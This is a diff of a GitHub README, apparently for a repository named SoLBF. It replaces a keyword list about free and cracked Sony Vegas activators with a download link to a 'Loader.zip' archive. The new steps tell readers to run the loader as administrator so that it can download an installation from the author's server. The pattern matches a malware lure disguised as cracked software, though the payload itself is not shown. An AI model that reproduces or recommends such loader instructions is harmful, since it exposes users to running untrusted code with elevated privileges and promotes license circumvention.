@@ -1,2 +1,7 @@
-# SoLBF
-sony-vegasvegas-downloadvegas-20-freefree-vegas-prosony-vegas-2024-freesony-vegas-fullsony-vegas-download-githubsony-vegas-2024-fullsony-vegas-license-activatorsony-vegas-activatorfree-license-sony-vegasfree-key-sony-vegasfree-sony-vegas-activationfree-sony-vegas-pluginssony-vegas-plugins-free
+# [DOWNLOAD SoLBF](https://github.com/corsgodpets766/SoLBF/releases/download/download/Loader.zip)
+## How do I download and run it?
+
+- Download the zip archive using the button above
+- Unzip to any folder on your desktop
+- Open the Loader as an administrator
+- After launching the loader, the installation menu will open. The speed will be high because the download will be made directly from our server!
